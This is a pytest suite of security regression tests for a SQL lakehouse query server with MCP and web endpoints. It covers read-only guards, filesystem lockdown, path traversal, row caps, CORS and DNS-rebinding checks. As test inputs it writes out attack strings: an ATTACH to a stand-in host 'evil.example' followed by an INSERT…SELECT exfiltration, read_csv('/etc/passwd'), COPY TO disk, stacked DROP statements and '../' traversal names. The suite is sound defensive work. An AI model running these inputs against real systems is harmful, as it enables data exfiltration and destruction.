"""Security regression tests for the audit fixes.

Pins the behaviors that an attacker would otherwise use against the
network-facing endpoints:

* the web read-only guard rejects writes hidden behind EXPLAIN/PRAGMA
  (prefix matching used to let ``EXPLAIN ANALYZE INSERT ...`` EXECUTE),
* the MCP ``run_sql`` tool runs the same parser guard by default
  (decision D2, ``SQLHANDLER_MCP_READONLY``) — multi-statement DDL used to
  execute there, which is what enabled the ATTACH-exfiltration path,
* external attached catalogs are reachable only through a SELECT-only
  connection — ``INSERT INTO <sink>.t SELECT * FROM <attached>.…`` cannot
  exfiltrate through run_sql, even with the MCP read-only mode opted out,
* DuckDB's own filesystem access is locked down for SQL queries (no
  read_csv('/etc/passwd'), no COPY ... TO, registered views still work),
* user-supplied table names cannot traverse outside the NFS root,
* SQLHANDLER_SOURCES rejects duplicate / non-identifier source labels,
* the /mcp transport guard (DNS-rebinding protection) and the scoped CORS
  default are on, and /metrics + /ready are auth-gated only when asked.

These tests document the *reason* for each rejection — if one starts
failing, re-read the attack before loosening the assertion.
"""

import json
import re
from contextlib import contextmanager

import pyarrow as pa
import pyarrow.parquet as pq
import pytest

from sqlhandler import server
from sqlhandler.config import FileConfig, load_source_providers
from sqlhandler.engine import SqlEngine, _max_rows
from sqlhandler.external import AttachSpec
from sqlhandler.file import FileProvider
from sqlhandler.provider import LakehouseError
from sqlhandler.server import _arrow_to_markdown

# ---------------------------------------------------------------------------
# DuckDB filesystem lockdown (engine-level defense for MCP + web queries)
# ---------------------------------------------------------------------------


class _NoTables:
    """Minimal provider stub: no tables, everything else unused."""

    kind = "stub"

    def list_tables(self):
        return []

    def table_uri(self, info):
        return f"stub://{info.path}"

    def open_dataset(self, info, version=None):  # pragma: no cover - never reached here
        raise AssertionError("open_dataset should not be called in these tests")


def _engine() -> SqlEngine:
    return SqlEngine(_NoTables())


def _registered_engine(monkeypatch) -> SqlEngine:
    """Engine whose schema registration registers a real in-memory view."""
    eng = _engine()

    def fake_register(self, con, sql, version=None, **kw):
        con.register("stub_tbl", pa.table({"a": [1, 2, 3], "s": ["x", "y", "z"]}))

    monkeypatch.setattr(SqlEngine, "_register_schema", fake_register)
    return eng


def _registered_schema_of(table: pa.Table):
    """Return a _register_schema replacement registering ``table`` as 'big'."""

    def fake_register(self, con, sql, version=None, **kw):
        con.register("big", table)

    return fake_register


def test_query_blocks_local_file_reads():
    with pytest.raises(LakehouseError, match="disabled by configuration"):
        _engine().query_duckdb("SELECT count(*) FROM read_csv('/etc/passwd')")


def test_query_blocks_copy_to_disk(tmp_path, monkeypatch):
    target = tmp_path / "exfil.parquet"
    monkeypatch.setattr(SqlEngine, "_register_schema", _registered_schema_of(_big_arrow(3)))
    eng = _engine()
    with pytest.raises(LakehouseError, match="disabled by configuration"):
        eng.query_duckdb(f"COPY big TO '{target}' (FORMAT PARQUET)")
    assert not target.exists()


def test_query_still_scans_registered_views(monkeypatch):
    """The lockdown must not break the engine's registered-dataset path."""
    eng = _registered_engine(monkeypatch)
    out = eng.query_duckdb("SELECT sum(a) AS total FROM stub_tbl")
    assert out.column("total")[0].as_py() == 6


def test_query_blocks_url_reads(monkeypatch):
    """No DuckDB-side network fetches (extension autoload is disabled)."""
    eng = _registered_engine(monkeypatch)
    with pytest.raises(LakehouseError):
        eng.query_duckdb("SELECT count(*) FROM 'https://127.0.0.1:1/nope.csv'")


def test_query_file_access_escape_hatch(monkeypatch):
    """SQLHANDLER_DUCKDB_FILE_ACCESS=1 restores DuckDB file functions."""
    monkeypatch.setenv("SQLHANDLER_DUCKDB_FILE_ACCESS", "1")
    out = _engine().query_duckdb("SELECT count(*) FROM read_csv('/etc/passwd')")
    assert out.num_rows == 1  # headerless single-column read of a real file


# ---------------------------------------------------------------------------
# Table-name traversal guards
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "name",
    [
        "../secret.parquet",
        "sub/../secret.parquet",
        "..",
        "a/../..",
        "/etc/passwd",
        "x\x00y",
    ],
)
def test_engine_rejects_traversal_names(name):
    with pytest.raises(LakehouseError):
        _engine().describe_table(name)


def _nfs_engine(root) -> SqlEngine:
    return SqlEngine(FileProvider(FileConfig(root_dir=str(root))), cache_ttl=0, dataset_cache_ttl=0)


def test_nfs_provider_cannot_read_outside_root(tmp_path):
    root = tmp_path / "root"
    (root / "sub").mkdir(parents=True)
    pq.write_table(pa.table({"pub": [1]}), root / "sub" / "pub.parquet")
    secret = tmp_path / "secret.parquet"
    pq.write_table(pa.table({"secret": [1, 2, 3]}), secret)

    # Provider level (called directly, bypassing the engine resolver):
    from sqlhandler.provider import TableInfo

    prov = FileProvider(FileConfig(root_dir=str(root)))
    with pytest.raises(LakehouseError, match="outside the NFS root"):
        prov.open_dataset(TableInfo(name="secret.parquet", schema="..", format="parquet"))
    with pytest.raises(LakehouseError, match="outside the NFS root"):
        prov.table_uri(TableInfo(name="secret.parquet", schema="..", format="parquet"))

    # Engine level (user-supplied name resolved then opened): the engine's
    # own traversal guard may fire first — either rejection is correct.
    eng = _nfs_engine(root)
    with pytest.raises(LakehouseError):
        eng.describe_table("../secret.parquet")
    with pytest.raises(LakehouseError):
        eng.scan_arrow("../secret.parquet", limit=5)
    # And the legit table still resolves.
    assert eng.describe_table("sub/pub.parquet")["columns"][0]["name"] == "pub"


def test_s3_provider_rejects_traversal_segments():
    from sqlhandler.config import S3Config
    from sqlhandler.provider import TableInfo
    from sqlhandler.s3 import S3Provider

    prov = S3Provider(S3Config(bucket="b", access_key="a", secret_key="s"))
    info = TableInfo(name="x", schema="..", format="parquet")
    with pytest.raises(LakehouseError, match="Invalid S3 table location"):
        prov.open_dataset(info)


# ---------------------------------------------------------------------------
# SQLHANDLER_SOURCES label validation
# ---------------------------------------------------------------------------


def test_sources_reject_duplicate_labels():
    raw = (
        '[{"name":"sales","bucket":"a","accessKey":"k","secretKey":"s"},'
        '{"name":"sales","bucket":"b","accessKey":"k","secretKey":"s"}]'
    )
    with pytest.raises(ValueError, match="duplicated"):
        load_source_providers({"SQLHANDLER_SOURCES": raw})


@pytest.mark.parametrize("bad", ["my-source", "my source", "1source", "a.b"])
def test_sources_reject_unsafe_labels(bad):
    raw = f'[{{"name":"{bad}","bucket":"a","accessKey":"k","secretKey":"s"}}]'
    with pytest.raises(ValueError, match="valid identifier"):
        load_source_providers({"SQLHANDLER_SOURCES": raw})


def test_sources_accept_safe_labels():
    raw = (
        '[{"name":"sales","bucket":"b1","accessKey":"k","secretKey":"s"},'
        '{"name":"source2","bucket":"b2","accessKey":"k","secretKey":"s"}]'
    )
    mp = load_source_providers({"SQLHANDLER_SOURCES": raw})
    assert mp is not None and mp.source_count == 2


# ---------------------------------------------------------------------------
# SQLHANDLER_MAX_ROWS cap (the MCP memory-exhaustion guard)
# ---------------------------------------------------------------------------


def _big_arrow(n):
    return pa.table({"i": list(range(n))})


def test_max_rows_default_and_garbage(monkeypatch):
    monkeypatch.delenv("SQLHANDLER_MAX_ROWS", raising=False)
    assert _max_rows() == 1000
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "banana")
    assert _max_rows() == 1000
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "-3")
    assert _max_rows() == 0  # negative clamps to "disabled"


def test_query_duckdb_caps_rows(monkeypatch):
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "50")
    monkeypatch.setattr(SqlEngine, "_register_schema", _registered_schema_of(_big_arrow(200)))
    out = _engine().query_duckdb("SELECT i FROM big")
    assert out.num_rows == 50


def test_query_duckdb_explicit_limit_min_of_both(monkeypatch):
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "50")
    monkeypatch.setattr(SqlEngine, "_register_schema", _registered_schema_of(_big_arrow(200)))
    eng = _engine()
    assert eng.query_duckdb("SELECT i FROM big", limit=10).num_rows == 10  # limit < cap
    assert eng.query_duckdb("SELECT i FROM big", limit=500).num_rows == 50  # cap wins


def test_query_duckdb_cap_disabled(monkeypatch):
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "0")
    monkeypatch.setattr(SqlEngine, "_register_schema", _registered_schema_of(_big_arrow(200)))
    assert _engine().query_duckdb("SELECT i FROM big").num_rows == 200


# ---------------------------------------------------------------------------
# Markdown output cap (SQLHANDLER_MAX_OUTPUT_ROWS)
# ---------------------------------------------------------------------------


def test_markdown_caps_output_rows(monkeypatch):
    monkeypatch.setenv("SQLHANDLER_MAX_OUTPUT_ROWS", "20")
    md = _arrow_to_markdown(_big_arrow(100), max_rows=None)
    data_lines = [line for line in md.splitlines() if line.startswith("|")]
    # header + separator + at most 20 data rows
    assert len(data_lines) <= 22
    assert any("19" in line for line in data_lines)  # last rendered row is 19
    assert not any("| 99" in line for line in data_lines)  # nothing past the cap


def test_markdown_garbage_env_falls_back(monkeypatch):
    """A garbage cap env var must not dump the raw Arrow repr to the client."""
    monkeypatch.setenv("SQLHANDLER_MAX_OUTPUT_ROWS", "banana")
    md = _arrow_to_markdown(_big_arrow(5), max_rows=None)
    assert md.startswith("|")  # still a rendered markdown table
    assert "pyarrow" not in md.lower()


# ---------------------------------------------------------------------------
# misc: iceberg error message no longer tuple-mangled
# ---------------------------------------------------------------------------


def test_iceberg_unconfigured_error_message():
    from sqlhandler.config import IcebergConfig
    from sqlhandler.iceberg import IcebergProvider

    with pytest.raises(LakehouseError) as excinfo:
        IcebergProvider(IcebergConfig())
    msg = str(excinfo.value)
    assert msg.startswith("Iceberg connection is not configured.")
    assert not msg.startswith("(")  # the old two-arg raise mangled the message


# ---------------------------------------------------------------------------
# MCP run_sql read-only guard (decision D2, SQLHANDLER_MCP_READONLY)
# ---------------------------------------------------------------------------


def _run_sql_engine(calls: list[str]):
    """Stub engine for server.run_sql: records the SQL it is handed."""

    class _Recording:
        def query_duckdb(self, sql, limit=None, params=None, version_as_of=None, **kw):
            calls.append(sql)
            return pa.table({"ok": [1]})

    return _Recording()


@pytest.fixture()
def mcp_readonly_env(monkeypatch):
    """Default posture for every D2 test: the env is unset (guard ON)."""
    monkeypatch.delenv("SQLHANDLER_MCP_READONLY", raising=False)


@pytest.mark.parametrize(
    "sql",
    [
        "CREATE TABLE t (a int)",
        "INSERT INTO t VALUES (1)",
        "DROP TABLE t",
        "ATTACH 'host=evil.example port=5432 dbname=x' AS sink (TYPE postgres)",
        "COPY t TO '/tmp/exfil.parquet' (FORMAT PARQUET)",
        "SELECT 1; DROP TABLE t",  # multi-statement script
        "UPDATE t SET a = 1",
    ],
)
def test_mcp_run_sql_rejects_ddl_by_default(monkeypatch, mcp_readonly_env, sql):
    """P0-5: the MCP path used to execute multi-statement DDL unchecked."""
    from sqlhandler import server

    calls: list[str] = []
    monkeypatch.setattr(server, "_handler", lambda: _run_sql_engine(calls))
    out = server.run_sql(sql)
    assert "Error running SQL:" in out
    assert "SQLHANDLER_MCP_READONLY" in out  # the error must name the env
    assert calls == []  # the engine was never reached


def test_mcp_run_sql_opt_out_restores_ddl(monkeypatch, mcp_readonly_env):
    """SQLHANDLER_MCP_READONLY=0 restores today's DDL capability (D2 hatch)."""
    from sqlhandler import server

    calls: list[str] = []
    monkeypatch.setattr(server, "_handler", lambda: _run_sql_engine(calls))
    monkeypatch.setenv("SQLHANDLER_MCP_READONLY", "0")
    out = server.run_sql("SELECT 41+1 AS answer")
    assert "Error" not in out
    assert calls == ["SELECT 41+1 AS answer"]


def test_mcp_run_sql_selects_unaffected(mcp_readonly_env, monkeypatch):
    """Legitimate read-only callers see identical behavior (D2 UX note)."""
    from sqlhandler import server

    calls: list[str] = []
    monkeypatch.setattr(server, "_handler", lambda: _run_sql_engine(calls))
    assert "Error" not in server.run_sql("SELECT * FROM work_order_header LIMIT 3")
    assert "Error" not in server.run_sql("WITH x AS (SELECT 1 AS a) SELECT * FROM x")
    assert len(calls) == 2


def test_mcp_readonly_env_is_reread_per_call(monkeypatch, mcp_readonly_env):
    """Flipping the env reaches a running process without a restart."""
    from sqlhandler.sqlguard import mcp_readonly_enabled

    assert mcp_readonly_enabled()  # default on
    monkeypatch.setenv("SQLHANDLER_MCP_READONLY", "0")
    assert not mcp_readonly_enabled()
    monkeypatch.setenv("SQLHANDLER_MCP_READONLY", "1")
    assert mcp_readonly_enabled()


# ---------------------------------------------------------------------------
# ATTACH-exfiltration closure (engine-level, unconditional)
# ---------------------------------------------------------------------------


_OPS_SPEC = AttachSpec(
    name="ops",
    type="postgres",
    host="pg.internal",
    port=5432,
    database="opsdb",
    user="ro_user",
    password_env="",
)


def _attach_engine(monkeypatch) -> SqlEngine:
    """Engine with the ops attach configured; apply_external recorded, not run."""
    import sqlhandler.engine as eng_mod

    eng = _engine()
    eng.attaches = [_OPS_SPEC]
    applied: list = []
    monkeypatch.setattr(eng_mod, "apply_external", lambda con, specs: applied.append(list(specs)))
    monkeypatch.setattr(
        eng_mod.SqlEngine,
        "_register_schema",
        lambda self, con, sql, version=None, materialize=True, **kw: None,
    )
    eng._applied_attaches = applied  # type: ignore[attr-defined]
    return eng


def test_attach_exfil_insert_is_refused(monkeypatch):
    """`INSERT INTO <sink>.t SELECT * FROM <attached>.…` must never run."""
    eng = _attach_engine(monkeypatch)
    with pytest.raises(LakehouseError, match="attached external databases"):
        eng.query_duckdb("INSERT INTO sink.public.stolen SELECT * FROM ops.public.work_orders")
    assert eng._applied_attaches == []  # extensions were never even loaded


def test_attach_exfil_via_multistatement_script_is_refused(monkeypatch):
    """The audit's attack: ATTACH your own sink, then INSERT ... SELECT."""
    eng = _attach_engine(monkeypatch)
    attack = (
        "ATTACH 'host=evil.example port=5432 dbname=x' AS sink (TYPE postgres); "
        "INSERT INTO sink.public.stolen SELECT * FROM ops.public.work_orders"
    )
    with pytest.raises(LakehouseError, match="attached external databases"):
        eng.query_duckdb(attack)
    assert eng._applied_attaches == []


def test_attach_exfil_not_enabled_by_mcp_opt_out(monkeypatch, mcp_readonly_env):
    """SQLHANDLER_MCP_READONLY=0 lifts the LAKE guard only — not this one."""
    from sqlhandler.sqlguard import mcp_readonly_enabled

    monkeypatch.setenv("SQLHANDLER_MCP_READONLY", "0")
    assert not mcp_readonly_enabled()  # opt-out really is on
    eng = _attach_engine(monkeypatch)
    with pytest.raises(LakehouseError, match="attached external databases"):
        eng.query_duckdb("INSERT INTO sink.public.stolen SELECT * FROM ops.public.work_orders")
    assert eng._applied_attaches == []


def test_attach_read_queries_still_allowed(monkeypatch):
    """SELECTs that join the attached catalog still reach the attach path."""
    eng = _attach_engine(monkeypatch)
    with pytest.raises(LakehouseError) as excinfo:
        eng.query_duckdb("SELECT count(*) FROM ops.public.work_orders")
    assert eng._applied_attaches == [[_OPS_SPEC]]  # attach path was taken
    assert "attached external databases" not in str(excinfo.value)  # not the guard


def test_plain_lake_connection_never_sees_attaches(monkeypatch):
    """A lake-only script runs on a connection that never had the attaches."""
    import sqlhandler.engine as eng_mod

    eng = _engine()
    eng.attaches = [_OPS_SPEC]
    applied: list = []
    monkeypatch.setattr(eng_mod, "apply_external", lambda con, specs: applied.append(list(specs)))
    monkeypatch.setattr(
        eng_mod.SqlEngine,
        "_register_schema",
        lambda self, con, sql, version=None, materialize=True, **kw: None,
    )
    # No attached alias referenced -> plain path, no attach, no SELECT-only
    # guard: with the MCP opt-out a caller regains multi-statement DDL on
    # lake data (D2 — the audited capability), but the connection has no ops
    # catalog and no scanner extension to build a sink with — nothing to
    # exfiltrate INTO.
    monkeypatch.setenv("SQLHANDLER_MCP_READONLY", "0")
    script = "CREATE TEMP TABLE scratch (a int); INSERT INTO scratch VALUES (41), (1); SELECT sum(a) AS total FROM scratch"
    out = eng.query_duckdb(script)  # must not raise
    assert out.column("total")[0].as_py() == 42
    assert applied == []


# ---------------------------------------------------------------------------
# Parser statement spans (the _split_statements quick win)
# ---------------------------------------------------------------------------


def test_split_statements_uses_parser_spans():
    from sqlhandler.webui import _split_statements

    # Semicolon inside a string literal does not split...
    assert _split_statements("SELECT 'a;b' AS x") == ["SELECT 'a;b' AS x"]
    # ...an escaped quote does not confuse the boundary (spans are the
    # parser's exact statement text — no heuristic semicolon scan)...
    assert [s.strip() for s in _split_statements("SELECT 'it''s'; SELECT 2")] == [
        "SELECT 'it''s'",
        "SELECT 2",
    ]
    # ...and a semicolon inside a comment does not split either. (Trailing
    # terminators stay in the final span — boundary placement is what matters.)
    assert _split_statements("-- a ; comment\nSELECT 1") == ["-- a ; comment\nSELECT 1"]
    assert [s.strip().rstrip(";") for s in _split_statements("SELECT 1;;;")] == ["SELECT 1"]


def test_guard_rejects_rewrite_form_pragma_function():
    """DuckDB rewrites `PRAGMA table_info(t)` into a SELECT span — catch it."""
    from sqlhandler.webui import assert_readonly

    with pytest.raises(ValueError, match="PRAGMA"):
        assert_readonly("PRAGMA table_info(t)")
    with pytest.raises(ValueError, match="PRAGMA"):
        assert_readonly("SELECT * FROM pragma_table_info('t')")


# ---------------------------------------------------------------------------
# scan_table clamp (decision D4, SQLHANDLER_MAX_ROWS)
# ---------------------------------------------------------------------------


def _five_row_engine(tmp_path) -> SqlEngine:
    d = tmp_path / "t"
    d.mkdir(parents=True, exist_ok=True)
    pq.write_table(pa.table({"i": [0, 1, 2, 3, 4]}), d / "p.parquet")
    return SqlEngine(
        FileProvider(FileConfig(root_dir=str(tmp_path))), cache_ttl=0, dataset_cache_ttl=0
    )


def test_scan_arrow_default_limit_clamped_to_max_rows(monkeypatch, tmp_path):
    """limit=-1/None used to materialize the WHOLE table (audit MED)."""
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "3")
    eng = _five_row_engine(tmp_path)
    assert eng.scan_arrow("t").num_rows == 3  # no limit -> cap
    assert eng.scan_arrow("t", limit=-1).num_rows == 3  # explicit -1 -> cap


def test_scan_arrow_explicit_positive_limit_wins(monkeypatch, tmp_path):
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "3")
    eng = _five_row_engine(tmp_path)
    assert eng.scan_arrow("t", limit=2).num_rows == 2
    assert eng.scan_arrow("t", limit=0).num_rows == 0


def test_scan_arrow_cap_zero_keeps_unlimited(monkeypatch, tmp_path):
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "0")
    eng = _five_row_engine(tmp_path)
    assert eng.scan_arrow("t").num_rows == 5


# ---------------------------------------------------------------------------
# scan_table limit resolution at the tool boundary (decision D4, Wave-2 fix)
#
# The engine clamp above bounded the SCAN, but scan_table handed the RAW -1
# to _arrow_to_output, where pandas' .head(-1) silently dropped the LAST
# rendered row (verified: 50-row table -> 49; clamped cap 25 -> 24). The
# resolved limit (a positive int, or None when the cap is disabled) must
# reach the output layer too — no row may ever be silently dropped.
# ---------------------------------------------------------------------------


def _fifty_row_engine(tmp_path) -> SqlEngine:
    d = tmp_path / "big"
    d.mkdir(parents=True, exist_ok=True)
    pq.write_table(pa.table({"i": list(range(50))}), d / "p.parquet")
    return SqlEngine(
        FileProvider(FileConfig(root_dir=str(tmp_path))), cache_ttl=0, dataset_cache_ttl=0
    )


def test_resolve_scan_limit_semantics(monkeypatch):
    from sqlhandler.server import _resolve_scan_limit

    monkeypatch.delenv("SQLHANDLER_MAX_ROWS", raising=False)  # default cap 1000
    assert _resolve_scan_limit(-1) == 1000  # negative -> the cap value
    assert _resolve_scan_limit(None) == 1000  # missing -> the cap value
    assert _resolve_scan_limit(7) == 7  # explicit positive honored exactly
    assert _resolve_scan_limit(0) == 0  # explicit 0 stays an empty result
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "25")
    assert _resolve_scan_limit(-1) == 25
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "0")
    assert _resolve_scan_limit(-1) is None  # cap disabled -> unlimited
    assert _resolve_scan_limit(None) is None


def test_scan_table_negative_limit_returns_first_n_not_n_minus_one(monkeypatch, tmp_path):
    """limit=-1 with the default env over a 50-row table returns ALL 50 rows
    (exactly min(50, MAX_ROWS)) in table order — the last row included.
    The raw -1 used to survive into the output as .head(-1), which dropped
    row 49 (49 rows rendered)."""
    monkeypatch.delenv("SQLHANDLER_MAX_ROWS", raising=False)
    monkeypatch.setattr(server, "_handler", lambda: _fifty_row_engine(tmp_path))
    payload = json.loads(server.scan_table("big", limit=-1, output_format="json"))
    assert payload["n_rows"] == min(50, 1000)
    assert [r[0] for r in payload["rows"]] == list(range(50))  # the first-N rows
    assert payload["rows"][-1] == [49]  # last row present
    md = server.scan_table("big", limit=-1)  # markdown is where .head(-1) bit
    assert re.search(r"\|\s*49\s*\|", md)


def test_scan_table_clamped_cap_returns_first_cap_rows(monkeypatch, tmp_path):
    """MAX_ROWS=25 over 50 rows: exactly 25 rows — the FIRST 25, last one
    present (the clamped cap used to render 24 via .head(-1))."""
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "25")
    monkeypatch.setattr(server, "_handler", lambda: _fifty_row_engine(tmp_path))
    payload = json.loads(server.scan_table("big", limit=-1, output_format="json"))
    assert payload["n_rows"] == 25
    assert [r[0] for r in payload["rows"]] == list(range(25))
    assert payload["rows"][-1] == [24]
    assert payload["truncated"] is True  # more rows exist upstream


def test_scan_table_explicit_limit_returns_exactly_n(monkeypatch, tmp_path):
    monkeypatch.setattr(server, "_handler", lambda: _fifty_row_engine(tmp_path))
    payload = json.loads(server.scan_table("big", limit=7, output_format="json"))
    assert payload["n_rows"] == 7
    assert [r[0] for r in payload["rows"]] == list(range(7))


def test_scan_table_cap_zero_returns_all_rows(monkeypatch, tmp_path):
    """SQLHANDLER_MAX_ROWS=0 (cap disabled): limit=-1 -> unlimited."""
    monkeypatch.setenv("SQLHANDLER_MAX_ROWS", "0")
    monkeypatch.setattr(server, "_handler", lambda: _fifty_row_engine(tmp_path))
    payload = json.loads(server.scan_table("big", limit=-1, output_format="json"))
    assert payload["n_rows"] == 50
    assert payload["rows"][-1] == [49]


def test_scan_table_explicit_zero_is_empty_result(monkeypatch, tmp_path):
    """An explicit 0 stays an explicit empty result (dispatcher contract)."""
    monkeypatch.setattr(server, "_handler", lambda: _fifty_row_engine(tmp_path))
    payload = json.loads(server.scan_table("big", limit=0, output_format="json"))
    assert payload["n_rows"] == 0


def test_markdown_non_positive_max_rows_never_drops_rows():
    """Boundary rule in the renderer: 0 = unlimited (no head at all) and a
    negative count never reaches .head (head(-1) drops the LAST row)."""
    md = _arrow_to_markdown(_big_arrow(5), max_rows=0)
    for i in range(5):
        assert re.search(rf"\|\s*{i}\s*\|", md)  # all 5 rows rendered
    md = _arrow_to_markdown(_big_arrow(5), max_rows=-1)
    for i in range(5):
        assert re.search(rf"\|\s*{i}\s*\|", md)  # was 4 rows via .head(-1)


# ---------------------------------------------------------------------------
# Query timeout default (decision D5, SQLHANDLER_QUERY_TIMEOUT)
# ---------------------------------------------------------------------------


def test_query_timeout_default_is_600s(monkeypatch):
    from sqlhandler.engine import _query_timeout

    monkeypatch.delenv("SQLHANDLER_QUERY_TIMEOUT", raising=False)
    assert _query_timeout() == 600.0
    monkeypatch.setenv("SQLHANDLER_QUERY_TIMEOUT", "banana")
    assert _query_timeout() == 600.0  # garbage -> default, not disable
    monkeypatch.setenv("SQLHANDLER_QUERY_TIMEOUT", "0")
    assert _query_timeout() == 0.0  # explicit 0 = old no-timeout behavior


def test_query_timeout_error_names_env(monkeypatch, tmp_path):
    import time as _time

    from sqlhandler.engine import _query_timeout

    def slow_register(self, con, sql, version=None, **kw):
        _time.sleep(1.0)

    monkeypatch.setattr(SqlEngine, "_register_schema", slow_register)
    monkeypatch.setenv("SQLHANDLER_QUERY_TIMEOUT", "0.2")
    assert _query_timeout() == 0.2
    with pytest.raises(LakehouseError, match="SQLHANDLER_QUERY_TIMEOUT"):
        _engine().query_duckdb("SELECT 1")


# ---------------------------------------------------------------------------
# HTTP layer: /mcp transport guard, CORS scoping, /metrics+/ready gate
# ---------------------------------------------------------------------------


class _StubProvider:
    kind = "stub"

    def check_connection(self):
        return None


class _StubEngine:
    provider = _StubProvider()

    def query_duckdb(self, sql, limit=None, params=None, version_as_of=None, **kw):
        return pa.table({"a": [1]})

    def scan_arrow(self, table, columns=None, limit=None, version_as_of=None):
        return pa.table({"a": [1]})

    def catalog_status(self):
        return {"store_path": "/tmp/stub"}


@contextmanager
def _client(monkeypatch, **env):
    """Fresh app + TestClient (lifespan entered) with a stubbed engine.

    Used as ``with _client(monkeypatch, ENV=...) as client:`` — the with-body
    keeps the app's lifespan task group alive, which POST /mcp needs.
    """
    from starlette.testclient import TestClient

    from sqlhandler import server

    for name in (
        "SQLHANDLER_ALLOWED_ORIGINS",
        "SQLHANDLER_ALLOWED_HOSTS",
        "SQLHANDLER_CORS_ORIGINS",
        "SQLHANDLER_METRICS_AUTH",
        "SQLHANDLER_API_TOKEN",
        "MCP_API_KEYS",
        "SQLHANDLER_API_KEYS",
    ):
        monkeypatch.delenv(name, raising=False)
    for name, value in env.items():
        monkeypatch.setenv(name, value)
    monkeypatch.setattr(server, "_handler", lambda: _StubEngine())
    app = server._build_http_app()
    with TestClient(app) as client:
        yield client


def _ping(client, headers=None):
    return client.post(
        "/mcp",
        json={"jsonrpc": "2.0", "method": "ping", "id": 1},
        headers={"Accept": "application/json, text/event-stream", **(headers or {})},
    )


def test_mcp_transport_guard_blocks_browser_origin(monkeypatch):
    """Rebinding protection ON: a browser-originated /mcp call is 403'd."""
    with _client(monkeypatch) as client:
        r = _ping(client, {"Origin": "https://evil.example"})
        assert r.status_code == 403
        # No Origin header (every real MCP client) is unaffected.
        assert _ping(client).status_code == 200


def test_mcp_transport_guard_allowed_origins(monkeypatch):
    with _client(monkeypatch, SQLHANDLER_ALLOWED_ORIGINS="https://inspector.example") as client:
        assert _ping(client, {"Origin": "https://inspector.example"}).status_code == 200
        assert _ping(client, {"Origin": "https://evil.example"}).status_code == 403


def test_mcp_transport_guard_host_allowlist(monkeypatch):
    """SQLHANDLER_ALLOWED_HOSTS pins the Host header (strict, opt-in)."""
    with _client(monkeypatch, SQLHANDLER_ALLOWED_HOSTS="testserver,localhost:*") as client:
        assert _ping(client).status_code == 200  # TestClient's default Host
        r = _ping(client, {"Host": "evil.example"})
        assert r.status_code == 421
        assert _ping(client, {"Host": "localhost:9097"}).status_code == 200  # :* wildcard


def test_mcp_transport_guard_missing_host(monkeypatch):
    """A Host-less request is refused (unit: ASGI scope without a host)."""
    from sqlhandler.server import _McpTransportGuard

    verdict = _McpTransportGuard._reject(
        {"type": "http", "path": "/mcp", "method": "POST", "headers": []}
    )
    assert verdict == (421, "Missing Host header")


def test_cors_default_same_origin_only(monkeypatch):
    """Decision D3: no ACAO header for anyone until origins are configured."""
    with _client(monkeypatch) as client:
        r = client.get("/api/status", headers={"Origin": "https://evil.example"})
        assert r.status_code == 200
        assert "access-control-allow-origin" not in r.headers


def test_cors_scoped_to_configured_origins(monkeypatch):
    with _client(monkeypatch, SQLHANDLER_ALLOWED_ORIGINS="https://ui.example.com") as client:
        r = client.get("/api/status", headers={"Origin": "https://ui.example.com"})
        assert r.headers.get("access-control-allow-origin") == "https://ui.example.com"
        r = client.get("/api/status", headers={"Origin": "https://evil.example"})
        assert "access-control-allow-origin" not in r.headers


def test_cors_legacy_var_still_honored(monkeypatch):
    """SQLHANDLER_CORS_ORIGINS (the old env) still works when set explicitly."""
    with _client(monkeypatch, SQLHANDLER_CORS_ORIGINS="https://legacy.example") as client:
        r = client.get("/api/status", headers={"Origin": "https://legacy.example"})
        assert r.headers.get("access-control-allow-origin") == "https://legacy.example"


def test_metrics_and_ready_open_by_default(monkeypatch):
    """Default OFF = today's behavior: both endpoints unauthenticated."""
    with _client(monkeypatch) as client:
        assert client.get("/metrics").status_code == 200
        assert client.get("/ready").status_code == 200


def test_metrics_auth_gate(monkeypatch):
    """SQLHANDLER_METRICS_AUTH=1 gates /metrics only; /ready stays open (kubelet probes cannot authenticate)."""
    with _client(
        monkeypatch, SQLHANDLER_METRICS_AUTH="1", SQLHANDLER_API_TOKEN="probe-token"
    ) as client:
        assert client.get("/metrics").status_code == 401
        assert client.get("/metrics", headers={"X-API-Token": "probe-token"}).status_code == 200
        # /ready + /health stay open for kubelet probes either way.
        assert client.get("/ready").status_code == 200
        assert client.get("/health").status_code == 200


def test_metrics_auth_accepts_mcp_keys(monkeypatch):
    with _client(monkeypatch, SQLHANDLER_METRICS_AUTH="1", MCP_API_KEYS="k1,k2") as client:
        assert client.get("/metrics", headers={"X-API-Key": "k2"}).status_code == 200
        assert client.get("/metrics").status_code == 401


def test_metrics_auth_without_credentials_fails_closed(monkeypatch):
    """Gate on but no secret configured: deny everyone (visible misconfig). /ready stays open."""
    with _client(monkeypatch, SQLHANDLER_METRICS_AUTH="1") as client:
        assert client.get("/metrics").status_code == 401
        assert client.get("/ready").status_code == 200
